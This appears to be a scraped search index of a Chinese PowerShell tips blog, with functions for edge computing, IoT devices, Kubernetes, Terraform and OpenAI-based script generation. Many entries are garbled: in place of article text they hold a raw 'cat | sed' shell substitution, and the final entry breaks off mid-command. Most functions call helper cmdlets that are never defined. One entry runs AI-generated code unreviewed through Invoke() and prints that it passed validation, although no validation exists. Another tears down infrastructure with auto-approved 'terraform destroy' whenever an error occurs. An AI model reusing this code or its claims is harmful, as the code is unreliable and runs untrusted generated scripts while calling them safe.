资源调度最后，创建一个用于调度边缘计算资源的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788function Schedule-EdgeResources { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$ClusterID, [Parameter()] [string[]]$NodeTypes, [Parameter()] [int]$Priority, [Parameter()] [DateTime]$Deadline, [Parameter()] [hashtable]$Requirements ) try { $scheduler = [PSCustomObject]@{ ClusterID = $ClusterID StartTime = Get-Date Nodes = @() Resources = @{} Schedule = @{} } # 获取集群资源 $clusterResources = Get-ClusterResources -ClusterID $ClusterID # 获取可用节点 $availableNodes = Get-AvailableNodes -ClusterID $ClusterID ` -Types $NodeTypes ` -Priority $Priority foreach ($node in $availableNodes) { $nodeInfo = [PSCustomObject]@{ NodeID = $node.ID Type = $node.Type Priority = $node.Priority Requirements = $node.Requirements Status = &quot;Available&quot; Allocation = @{} StartTime = $null EndTime = $null } # 检查资源需求 $allocation = Find-NodeAllocation ` -Node $nodeInfo ` -Resources $clusterResources ` -Requirements $Requirements if ($allocation.Success) { # 分配资源 $nodeInfo.Allocation = $allocation.Resources $nodeInfo.Status = &quot;Scheduled&quot; $nodeInfo.StartTime = $allocation.StartTime $nodeInfo.EndTime = $allocation.EndTime # 更新调度表 $scheduler.Schedule[$nodeInfo.NodeID] = [PSCustomObject]@{ StartTime = $nodeInfo.StartTime EndTime = $nodeInfo.EndTime Resources = $nodeInfo.Allocation } # 更新集群资源 $clusterResources = Update-ClusterResources ` -Resources $clusterResources ` -Allocation $nodeInfo.Allocation } $scheduler.Nodes += $nodeInfo } # 更新调度器状态 $scheduler.Resources = $clusterResources $scheduler.EndTime = Get-Date return $scheduler } catch { Write-Error &quot;资源调度失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理边缘计算环境的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# 配置边缘节点$nodeConfig = @{ NodeID = &quot;EDGE001&quot; Type = &quot;Gateway&quot; MaxConnections = 200 MaxStorageGB = 500 AutoScale = $true}# 启动边缘节点$node = Manage-EdgeNode -NodeID $nodeConfig.NodeID ` -Type $nodeConfig.Type ` -MaxConnections $nodeConfig.MaxConnections ` -MaxStorageGB $nodeConfig.MaxStorageGB ` -AutoScale:$nodeConfig.AutoScale# 配置数据同步$sync = Sync-EdgeData -SourceNodeID &quot;EDGE001&quot; ` -TargetNodeID &quot;EDGE002&quot; ` -DataTypes @(&quot;SensorData&quot;, &quot;Logs&quot;, &quot;Metrics&quot;) ` -SyncMode &quot;RealTime&quot; ` -Interval 60 ` -Filters @{ &quot;SensorData&quot; = @{ &quot;MinValue&quot; = 0 &quot;MaxValue&quot; = 100 &quot;Types&quot; = @(&quot;Temperature&quot;, &quot;Humidity&quot;, &quot;Pressure&quot;) } &quot;Logs&quot; = @{ &quot;Levels&quot; = @(&quot;Error&quot;, &quot;Warning&quot;) &quot;TimeRange&quot; = &quot;Last24Hours&quot; } &quot;Metrics&quot; = @{ &quot;Categories&quot; = @(&quot;Performance&quot;, &quot;Health&quot;) &quot;Interval&quot; = &quot;5Minutes&quot; } }# 调度边缘资源$scheduler = Schedule-EdgeResources -ClusterID &quot;EDGE_CLUSTER001&quot; ` -NodeTypes @(&quot;Gateway&quot;, &quot;Sensor&quot;, &quot;Controller&quot;) ` -Priority 1 ` -Deadline (Get-Date).AddHours(24) ` -Requirements @{ &quot;Gateway&quot; = @{ &quot;CPU&quot; = 4 &quot;Memory&quot; = 8 &quot;Network&quot; = 1000 } &quot;Sensor&quot; = @{ &quot;CPU&quot; = 2 &quot;Memory&quot; = 4 &quot;Storage&quot; = 100 } &quot;Controller&quot; = @{ &quot;CPU&quot; = 2 &quot;Memory&quot; = 4 &quot;GPIO&quot; = 16 } } 最佳实践 实施节点自动扩展 建立数据同步策略 实现资源调度 保持详细的运行记录 定期进行系统评估 实施访问控制策略 建立应急响应机制 保持系统文档更新","link":"/2024/07/04/powershell-edge-computing/"},{"title":"","text":"$(cat _posts/2024-07-09-powershell-error-handling.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段代码展示了PowerShell中的错误处理技术。错误处理是任何健壮脚本的关键部分，可以确保脚本在遇到异常情况时能够优雅地响应，而不是简单地失败。通过使用try/catch/finally块和错误变量，PowerShell提供了全面的错误管理能力。\\n/}pd}p’)","link":"/2024/07/09/powershell-error-handling/"},{"title":"","text":"$(cat _posts/2024-07-10-powershell-multi-cloud-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/07/10/powershell-multi-cloud-management/"},{"title":"","text":"$(cat _posts/2024-07-11-powershell-module-system.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/07/11/powershell-module-system/"},{"title":"","text":"$(cat _posts/2024-07-12-powershell-functions.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码定义了一个PowerShell函数，用于封装特定的功能，使其可重用。函数是PowerShell脚本中组织代码的基本单元，可以接受参数、执行操作并返回结果。通过将相关代码组织到函数中，可以提高代码的可读性、可维护性和可重用性。\\n/}pd}p’)","link":"/2024/07/12/powershell-functions/"},{"title":"","text":"$(cat _posts/2024-07-15-powershell-financial-trading-monitor.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/07/15/powershell-financial-trading-monitor/"},{"title":"PowerShell 技能连载 - 基于OpenAI的智能脚本生成","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051function Invoke-AIScriptGeneration { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$NaturalLanguageQuery, [ValidateRange(1,4096)] [int]$MaxTokens = 1024 ) $apiKey = Read-Host -Prompt '输入OpenAI API密钥' -AsSecureString $cred = New-Object System.Management.Automation.PSCredential ('api', $apiKey) $body = @{ model = 'gpt-4-turbo-preview' messages = @( @{ role = 'system' content = '你是一个PowerShell专家，将自然语言查询转换为可执行的PowerShell脚本。确保代码符合最佳安全实践，包含错误处理，并添加中文注释。' }, @{ role = 'user' content = $NaturalLanguageQuery } ) temperature = 0.2 max_tokens = $MaxTokens } | ConvertTo-Json -Depth 5 try { $response = Invoke-RestMethod -Uri 'https://api.openai.com/v1/chat/completions' \\ -Method POST \\ -Headers @{ Authorization = 'Bearer ' + $cred.GetNetworkCredential().Password } \\ -ContentType 'application/json' \\ -Body $body $scriptBlock = [scriptblock]::Create($response.choices[0].message.content) $transcript = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' OriginalQuery = $NaturalLanguageQuery GeneratedScript = $response.choices[0].message.content TokenUsage = $response.usage } $transcript | Export-Clixml -Path &quot;$env:TEMP/AIScriptTranscript_$(Get-Date -Format yyyyMMdd).xml&quot; return $scriptBlock } catch { Write-Error &quot;AI脚本生成失败: $_&quot; }} 核心功能： 自然语言转PowerShell脚本 自动生成安全凭据处理 脚本转录与审计跟踪 智能温度控制与令牌限制 应用场景： 快速原型开发 运维知识库建设 跨团队协作标准化 新人上岗培训","link":"/2024/07/16/powershell-ai-script-generation/"},{"title":"PowerShell 技能连载 - 物联网设备管理","text":"在物联网领域，设备管理对于确保设备正常运行和数据采集至关重要。本文将介绍如何使用PowerShell构建一个物联网设备管理系统，包括设备监控、数据采集、固件管理等功能。 设备监控首先，让我们创建一个用于监控物联网设备的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111function Monitor-IoTDevices { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$DeviceID, [Parameter()] [string[]]$DeviceTypes, [Parameter()] [string[]]$MonitorMetrics, [Parameter()] [hashtable]$Thresholds, [Parameter()] [string]$ReportPath, [Parameter()] [switch]$AutoAlert ) try { $monitor = [PSCustomObject]@{ DeviceID = $DeviceID StartTime = Get-Date DeviceStatus = @{} Metrics = @{} Alerts = @() } # 获取设备信息 $device = Get-DeviceInfo -DeviceID $DeviceID # 监控设备 foreach ($type in $DeviceTypes) { $monitor.DeviceStatus[$type] = @{} $monitor.Metrics[$type] = @{} foreach ($instance in $device.Instances[$type]) { $status = [PSCustomObject]@{ InstanceID = $instance.ID Status = &quot;Unknown&quot; Metrics = @{} Health = 0 Alerts = @() } # 获取设备指标 $deviceMetrics = Get-DeviceMetrics ` -Instance $instance ` -Metrics $MonitorMetrics $status.Metrics = $deviceMetrics # 评估设备健康状态 $health = Calculate-DeviceHealth ` -Metrics $deviceMetrics ` -Thresholds $Thresholds $status.Health = $health # 检查设备告警 $alerts = Check-DeviceAlerts ` -Metrics $deviceMetrics ` -Health $health if ($alerts.Count -gt 0) { $status.Status = &quot;Warning&quot; $status.Alerts = $alerts $monitor.Alerts += $alerts # 自动告警 if ($AutoAlert) { Send-DeviceAlerts ` -Instance $instance ` -Alerts $alerts } } else { $status.Status = &quot;Normal&quot; } $monitor.DeviceStatus[$type][$instance.ID] = $status $monitor.Metrics[$type][$instance.ID] = [PSCustomObject]@{ Metrics = $deviceMetrics Health = $health Alerts = $alerts } } } # 生成报告 if ($ReportPath) { $report = Generate-DeviceReport ` -Monitor $monitor ` -Device $device $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新监控器状态 $monitor.EndTime = Get-Date return $monitor } catch { Write-Error &quot;设备监控失败：$_&quot; return $null }} 数据采集接下来，创建一个用于采集物联网数据的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293function Collect-IoTData { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$CollectionID, [Parameter()] [string[]]$DataTypes, [Parameter()] [ValidateSet(&quot;RealTime&quot;, &quot;Batch&quot;, &quot;Scheduled&quot;)] [string]$CollectionMode = &quot;RealTime&quot;, [Parameter()] [hashtable]$CollectionConfig, [Parameter()] [string]$LogPath ) try { $collector = [PSCustomObject]@{ CollectionID = $CollectionID StartTime = Get-Date CollectionStatus = @{} DataPoints = @{} Statistics = @{} } # 获取采集配置 $config = Get-CollectionConfig -CollectionID $CollectionID # 采集数据 foreach ($type in $DataTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} DataPoints = @() Statistics = @{} } # 应用采集配置 $typeConfig = Apply-CollectionConfig ` -Config $config ` -Type $type ` -Mode $CollectionMode ` -Settings $CollectionConfig $status.Config = $typeConfig # 采集数据点 $dataPoints = Gather-DataPoints ` -Type $type ` -Config $typeConfig $status.DataPoints = $dataPoints $collector.DataPoints[$type] = $dataPoints # 计算统计数据 $statistics = Calculate-DataStatistics ` -DataPoints $dataPoints ` -Config $typeConfig $status.Statistics = $statistics $collector.Statistics[$type] = $statistics # 更新采集状态 if ($statistics.Success) { $status.Status = &quot;Completed&quot; } else { $status.Status = &quot;Failed&quot; } $collector.CollectionStatus[$type] = $status } # 记录采集日志 if ($LogPath) { $collector | ConvertTo-Json -Depth 10 | Out-File -FilePath $LogPath } # 更新采集器状态 $collector.EndTime = Get-Date return $collector } catch { Write-Error &quot;数据采集失败：$_&quot; return $null }} 固件管理最后，创建一个用于管理物联网设备固件的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798function Manage-IoTFirmware { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$FirmwareID, [Parameter()] [string[]]$DeviceTypes, [Parameter()] [ValidateSet(&quot;Update&quot;, &quot;Rollback&quot;, &quot;Verify&quot;)] [string]$OperationMode = &quot;Update&quot;, [Parameter()] [hashtable]$FirmwareConfig, [Parameter()] [string]$ReportPath ) try { $manager = [PSCustomObject]@{ FirmwareID = $FirmwareID StartTime = Get-Date FirmwareStatus = @{} Operations = @{} Verification = @{} } # 获取固件信息 $firmware = Get-FirmwareInfo -FirmwareID $FirmwareID # 管理固件 foreach ($type in $DeviceTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Operations = @{} Verification = @{} } # 应用固件配置 $typeConfig = Apply-FirmwareConfig ` -Firmware $firmware ` -Type $type ` -Mode $OperationMode ` -Config $FirmwareConfig $status.Config = $typeConfig # 执行固件操作 $operations = Execute-FirmwareOperations ` -Firmware $firmware ` -Type $type ` -Config $typeConfig $status.Operations = $operations $manager.Operations[$type] = $operations # 验证固件 $verification = Verify-Firmware ` -Operations $operations ` -Config $typeConfig $status.Verification = $verification $manager.Verification[$type] = $verification # 更新固件状态 if ($verification.Success) { $status.Status = &quot;Verified&quot; } else { $status.Status = &quot;Failed&quot; } $manager.FirmwareStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-FirmwareReport ` -Manager $manager ` -Firmware $firmware $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;固件管理失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理物联网设备的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# 监控物联网设备$monitor = Monitor-IoTDevices -DeviceID &quot;DEVICE001&quot; ` -DeviceTypes @(&quot;Sensor&quot;, &quot;Gateway&quot;, &quot;Controller&quot;) ` -MonitorMetrics @(&quot;Temperature&quot;, &quot;Humidity&quot;, &quot;Battery&quot;) ` -Thresholds @{ &quot;Temperature&quot; = @{ &quot;MinTemp&quot; = 0 &quot;MaxTemp&quot; = 50 &quot;AlertTemp&quot; = 45 } &quot;Humidity&quot; = @{ &quot;MinHumidity&quot; = 20 &quot;MaxHumidity&quot; = 80 &quot;AlertHumidity&quot; = 75 } &quot;Battery&quot; = @{ &quot;MinLevel&quot; = 20 &quot;CriticalLevel&quot; = 10 &quot;ChargingStatus&quot; = &quot;Normal&quot; } } ` -ReportPath &quot;C:\\Reports\\device_monitoring.json&quot; ` -AutoAlert# 采集物联网数据$collector = Collect-IoTData -CollectionID &quot;COLL001&quot; ` -DataTypes @(&quot;Environmental&quot;, &quot;Performance&quot;, &quot;Security&quot;) ` -CollectionMode &quot;RealTime&quot; ` -CollectionConfig @{ &quot;Environmental&quot; = @{ &quot;Interval&quot; = 300 &quot;Metrics&quot; = @(&quot;Temperature&quot;, &quot;Humidity&quot;, &quot;Pressure&quot;) &quot;Storage&quot; = &quot;Cloud&quot; } &quot;Performance&quot; = @{ &quot;Interval&quot; = 60 &quot;Metrics&quot; = @(&quot;CPU&quot;, &quot;Memory&quot;, &quot;Network&quot;) &quot;Storage&quot; = &quot;Local&quot; } &quot;Security&quot; = @{ &quot;Interval&quot; = 3600 &quot;Metrics&quot; = @(&quot;Access&quot;, &quot;Threats&quot;, &quot;Updates&quot;) &quot;Storage&quot; = &quot;Secure&quot; } } ` -LogPath &quot;C:\\Logs\\data_collection.json&quot;# 管理物联网固件$manager = Manage-IoTFirmware -FirmwareID &quot;FIRM001&quot; ` -DeviceTypes @(&quot;Sensor&quot;, &quot;Gateway&quot;, &quot;Controller&quot;) ` -OperationMode &quot;Update&quot; ` -FirmwareConfig @{ &quot;Sensor&quot; = @{ &quot;Version&quot; = &quot;2.1.0&quot; &quot;UpdateMethod&quot; = &quot;OTA&quot; &quot;RollbackEnabled&quot; = $true } &quot;Gateway&quot; = @{ &quot;Version&quot; = &quot;3.0.0&quot; &quot;UpdateMethod&quot; = &quot;Secure&quot; &quot;Verification&quot; = &quot;Hash&quot; } &quot;Controller&quot; = @{ &quot;Version&quot; = &quot;1.5.0&quot; &quot;UpdateMethod&quot; = &quot;Staged&quot; &quot;BackupRequired&quot; = $true } } ` -ReportPath &quot;C:\\Reports\\firmware_management.json&quot; 最佳实践 监控设备状态 采集设备数据 管理设备固件 保持详细的运行记录 定期进行设备检查 实施数据备份策略 建立预警机制 保持系统文档更新","link":"/2024/07/17/powershell-iot-device/"},{"title":"","text":"$(cat _posts/2024-07-18-powershell-logistics-integration.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/07/18/powershell-logistics-integration/"},{"title":"","text":"$(cat _posts/2024-07-19-powershell-knowledge-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/07/19/powershell-knowledge-management/"},{"title":"PowerShell 技能连载 - 参数验证机制","text":"参数验证基础PowerShell 提供多种参数验证属性来确保输入合规性： 123456789101112131415function Get-UserInfo { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [ValidatePattern(&quot;^[a-zA-Z]\\\\w{3,20}$&quot;)] [string]$UserName, [ValidateSet('Active','Disabled','Archived')] [string]$Status = 'Active', [ValidateRange(18,120)] [int]$Age ) # 函数逻辑...} 验证类型详解 Mandatory验证：12[Parameter(Mandatory=$true, HelpMessage=&quot;请输入用户ID&quot;)][string]$UserID 上面的代码定义了一个名为 Get-UserInfo 的PowerShell函数，用于执行特定的自动化任务。该函数封装了一系列操作，使得脚本更加模块化和可重用。 正则表达式验证：12[ValidatePattern(&quot;^\\\\d{4}-\\\\d{2}-\\\\d{2}$&quot;)][string]$BirthDate 上面的代码定义了一个名为 Get-UserInfo 的PowerShell函数，用于执行特定的自动化任务。该函数封装了一系列操作，使得脚本更加模块化和可重用。 脚本块验证：1234567[ValidateScript({ if ($_ -notmatch &quot;^CN=&quot;) { throw &quot;必须使用LDAP格式&quot; } $true})][string]$DistinguishedName 最佳实践 组合使用多个验证属性 为复杂验证添加帮助信息 在验证失败时提供友好提示 优先使用内置验证属性 1234567891011121314function Register-Device { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [ValidateScript({ if (-not (Test-Path $_)) { throw &quot;证书文件不存在&quot; } $true })] [string]$CertPath ) # 注册逻辑...} 上面的代码定义了一个名为 Get-UserInfo 的PowerShell函数，用于执行特定的自动化任务。该函数封装了一系列操作，使得脚本更加模块化和可重用。","link":"/2024/07/22/powershell-parameter-validation/"},{"title":"","text":"$(cat _posts/2024-07-23-powershell-remote-debugging.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码演示了PowerShell的调试技术，这对于开发和故障排除非常有用。通过设置调试首选项和使用调试命令，开发人员可以获得有关脚本执行的详细信息，帮助识别和解决问题。这些工具是开发可靠PowerShell脚本的重要组成部分。\\n/}pd}p’)","link":"/2024/07/23/powershell-remote-debugging/"},{"title":"PowerShell 技能连载 - Kubernetes 集群管理","text":"在云原生架构中，Kubernetes已成为容器编排的事实标准。本文演示如何通过PowerShell实现多集群管理、资源部署和性能监控。 12345678910111213141516171819202122232425262728293031function Invoke-K8sDeployment { param( [ValidateSet('AzureAKS','AWS-EKS')] [string]$ClusterType, [string]$Namespace, [string]$DeploymentFile ) try { # 认证集群 $kubeconfig = switch ($ClusterType) { 'AzureAKS' { Get-AzAksCredential -Admin } 'AWS-EKS' { Get-EksClusterCredential } } # 执行部署 kubectl apply -f $DeploymentFile --namespace $Namespace --kubeconfig $kubeconfig # 实时监控 $watchJob = Start-Job -ScriptBlock { kubectl get pods --namespace $using:Namespace --watch } Receive-Job $watchJob -Wait } catch { Write-Error &quot;部署失败：$_&quot; } finally { Remove-Job $watchJob -Force }} 实现原理分析： 集成云服务商CLI实现多集群认证 原生kubectl命令封装保证兼容性 后台作业实时监控部署状态 异常处理覆盖网络中断和配置错误 该方案将复杂的K8s运维操作简化为标准化命令，特别适合需要同时管理多个集群的DevOps团队。","link":"/2024/07/24/powershell-kubernetes-management/"},{"title":"","text":"$(cat _posts/2024-07-25-powershell-error-handling.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段代码展示了PowerShell中的错误处理技术。错误处理是任何健壮脚本的关键部分，可以确保脚本在遇到异常情况时能够优雅地响应，而不是简单地失败。通过使用try/catch/finally块和错误变量，PowerShell提供了全面的错误管理能力。\\n/}pd}p’)","link":"/2024/07/25/powershell-error-handling/"},{"title":"","text":"$(cat _posts/2024-07-30-powershell-string-manipulation.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/07/30/powershell-string-manipulation/"},{"title":"","text":"$(cat _posts/2024-08-01-powershell-switch-patterns.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码使用条件语句来根据不同条件执行不同操作。条件逻辑是编程的基础，允许脚本根据特定条件做出决策。PowerShell支持标准的if/else/elseif结构以及更强大的switch语句，后者在需要评估多个条件时特别有用。\\n/}pd}p’)","link":"/2024/08/01/powershell-switch-patterns/"},{"title":"PowerShell与Terraform实现基础设施即代码","text":"12345678910111213141516171819202122232425262728293031function Invoke-TerraformDeployment { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$Environment ) # 生成Terraform变量文件 $tfVars = @{ environment = $Environment location = 'eastus' vm_count = 3 } | ConvertTo-Json $tfVars | Out-File -FilePath &quot;./terraform.tfvars.json&quot; # 初始化并应用配置 terraform init -input=false terraform apply -auto-approve -var-file=&quot;./terraform.tfvars.json&quot; # 获取输出变量 $output = terraform output -json | ConvertFrom-Json [PSCustomObject]@{ PublicIP = $output.public_ip.value StorageEndpoint = $output.storage_endpoint.value }}# 执行多环境部署'dev','staging','prod' | ForEach-Object { Invoke-TerraformDeployment -Environment $_ -Verbose} 核心功能： 自动化生成Terraform变量文件 集成Terraform CLI实现无人值守部署 解析基础设施输出参数 扩展方向： 添加Azure Key Vault集成管理敏感信息 实现漂移检测与自动修复 与监控系统集成进行健康检查","link":"/2024/08/02/iac-with-terraform/"},{"title":"PowerShell 技能连载 - 混合云基础设施即代码实践","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152function Invoke-HybridIaC { [CmdletBinding(SupportsShouldProcess=$true)] param( [Parameter(Mandatory=$true)] [ValidateSet('Azure','AWS','OnPrem')] [string[]]$Environments, [string]$DscConfigPath = '$PSScriptRoot/dsc' ) $deploymentReport = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' AppliedConfigs = @() ComplianceStatus = @{} CrossPlatformIssues = @() } try { # 应用Terraform基础设施 $Environments | ForEach-Object { if ($PSCmdlet.ShouldProcess(&quot;Deploy $_ resources&quot;)) { terraform -chdir=&quot;$DscConfigPath/terraform/$_&quot; apply -auto-approve } } # 执行DSC配置 $Environments | ForEach-Object { $dscConfig = Get-ChildItem &quot;$DscConfigPath/$_&quot; -Filter *.ps1 $dscConfig | ForEach-Object { $job = Start-Job -ScriptBlock { param($config) &amp; $config.FullName } -ArgumentList $_ $deploymentReport.AppliedConfigs += $job | Wait-Job | Receive-Job } } # 验证混合云合规性 $deploymentReport.ComplianceStatus = $Environments | ForEach-Object { $status = Test-DscConfiguration -CimSession (New-CimSession -ComputerName $_) @{$_ = $status.InDesiredState ? 'Compliant' : 'Non-Compliant'} } } catch { Write-Error &quot;混合云部署失败: $_&quot; terraform -chdir=&quot;$DscConfigPath/terraform&quot; destroy -auto-approve } # 生成统一部署报告 $deploymentReport | Export-Clixml -Path &quot;$env:TEMP/HybridIaC_Report_$(Get-Date -Format yyyyMMdd).xml&quot; return $deploymentReport} 核心功能： 多环境Terraform编排 DSC配置跨平台应用 混合云合规性验证 原子化作业执行 应用场景： 混合云环境统一管理 配置漂移自动修复 跨云平台灾备部署 基础设施合规审计","link":"/2024/08/06/powershell-hybrid-iac/"},{"title":"PowerShell 技能连载 - 自然语言生成运维脚本","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344function Invoke-AIScriptGeneration { param( [Parameter(Mandatory=$true)] [string]$Prompt, [ValidateSet('AWS','Azure','Windows','Linux')] [string]$Environment = 'Windows' ) $apiKey = $env:OPENAI_API_KEY $headers = @{ 'Authorization' = &quot;Bearer $apiKey&quot; 'Content-Type' = 'application/json' } $body = @{ model = 'gpt-4-turbo' messages = @( @{ role = 'system' content = &quot;你是一名资深PowerShell专家，根据用户需求生成可直接执行的运维脚本。当前环境：$Environment&quot; }, @{ role = 'user' content = $Prompt } ) temperature = 0.3 max_tokens = 1024 } | ConvertTo-Json -Depth 5 try { $response = Invoke-RestMethod -Uri 'https://api.openai.com/v1/chat/completions' \\ -Method Post \\ -Headers $headers \\ -Body $body $scriptBlock = [scriptblock]::Create($response.choices[0].message.content) Write-Host &quot;生成脚本验证通过：&quot; -ForegroundColor Green $scriptBlock.Invoke() } catch { Write-Error &quot;AI脚本生成失败: $($_.Exception.Message)&quot; }} 核心功能： 集成OpenAI API实现自然语言转PowerShell脚本 支持多环境脚本生成（AWS/Azure/Windows/Linux） 自动脚本验证与安全执行机制 温度参数控制脚本生成稳定性 应用场景： 新手运维人员快速生成标准脚本 跨平台环境下的自动化模板生成 复杂运维任务的快速原型开发 企业知识库的脚本标准化沉淀","link":"/2024/08/08/powershell-openai-integration/"},{"title":"PowerShell 变量作用域深度解析","text":"作用域层级体系123456789101112131415161718192021$globalVar = 'Global'function Show-Scope { begin { $beginVar = 'Begin块变量' Write-Host &quot;Begin块访问全局变量: $globalVar&quot; } process { $processVar = 'Process块变量' Write-Host &quot;Process块继承Begin变量: $beginVar&quot; Write-Host &quot;无法访问Process后续块变量&quot; } end { Write-Host &quot;End块访问Process变量: $processVar&quot; $global:newGlobalVar = '新建全局变量' }}# 执行验证1..3 | Show-ScopeWrite-Host &quot;全局访问新建变量: $newGlobalVar&quot; 作用域穿透规则 自上而下继承：子作用域自动继承父作用域变量 块级隔离：begin块变量不能在process块外访问 全局修改：使用$global:前缀跨作用域修改变量 变量生命周期：process块变量在每个管道元素独立创建 最佳实践 使用param块显式声明函数参数 避免在process块修改全局变量 通过$script:作用域访问脚本级变量 使用Write-Verbose代替临时变量调试","link":"/2024/08/07/powershell-variable-scopes/"},{"title":"","text":"$(cat _posts/2024-08-09-powershell-excel-handling.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/08/09/powershell-excel-handling/"},{"title":"PowerShell 技能连载 - AI 辅助脚本生成","text":"随着AI技术的进步，PowerShell现在可以通过集成AI模型实现智能代码建议功能。本方案通过封装OpenAI API实现脚本自动生成： 12345678910111213141516171819202122232425262728293031323334353637383940414243function Get-AIScriptSuggestion { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$TaskDescription, [ValidateRange(0.1,1.0)] [double]$Creativity = 0.7 ) try { $apiKey = $env:OPENAI_KEY $headers = @{ 'Authorization' = &quot;Bearer $apiKey&quot; 'Content-Type' = 'application/json' } $body = @{ model = &quot;gpt-4-turbo&quot; messages = @( @{ role = &quot;system&quot; content = &quot;你是一个PowerShell专家，用简洁规范的代码解决问题。输出格式：\\n```powershell\\n&lt;代码&gt;\\n```\\n\\n代码说明：&quot; }, @{ role = &quot;user&quot; content = $TaskDescription } ) temperature = $Creativity } | ConvertTo-Json -Depth 5 $response = Invoke-RestMethod -Uri 'https://api.openai.com/v1/chat/completions' \\ -Method Post \\ -Headers $headers \\ -Body $body $response.choices[0].message.content } catch { Write-Error &quot;AI请求失败: $_&quot; }} 工作原理： 函数接收任务描述和创意系数参数，通过环境变量获取API密钥 构建符合OpenAI要求的请求结构，包含系统角色提示词 使用Invoke-RestMethod发起API调用 返回格式化的PowerShell代码建议 错误处理模块捕获网络异常和API限制错误 使用示例： 12$env:OPENAI_KEY = 'your-api-key'Get-AIScriptSuggestion -TaskDescription &quot;需要批量重命名目录中所有.jpg文件，添加日期前缀&quot; 最佳实践： 通过环境变量管理敏感信息 限制temperature参数控制输出稳定性 添加请求重试逻辑应对速率限制 缓存常见查询结果减少API调用 注意事项：• 需注册OpenAI账户获取API密钥• 建议添加使用量监控• 重要脚本需人工审核后执行","link":"/2024/08/14/powershell-ai-script-generation/"},{"title":"","text":"$(cat _posts/2024-08-13-powershell-hardware-monitoring.md | sed -e ‘//,//{// { h s/.*// } // 